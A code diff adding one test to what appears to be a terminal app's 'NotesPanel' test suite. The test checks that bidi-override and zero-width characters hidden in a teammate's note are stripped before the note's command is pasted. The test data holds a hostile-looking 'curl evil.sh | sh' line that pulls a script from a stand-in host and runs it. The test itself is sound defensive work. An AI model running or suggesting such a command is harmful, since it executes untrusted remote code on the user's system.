@@ -108,6 +108,13 @@ describe("NotesPanel", () => {
       expect(h.inject).not.toHaveBeenCalled();
     });
 
+    test("strips bidi and zero-width characters a teammate's note could hide", () => {
+      h.code = "echo ok\u202e\u2066 && curl evil.sh | sh\u2069\u200b";
+      render(<NotesPanel />);
+      fireEvent.click(screen.getByText("run"));
+      expect(h.paste).toHaveBeenCalledWith("echo ok && curl evil.sh | sh");
+    });
+
     test("serial sessions get the button and paste", async () => {
       const { getTerminalApi } = await import("@/hooks/useTerminal");
       h.session = { id: "s4", type: "serial", connectionId: "c1" };
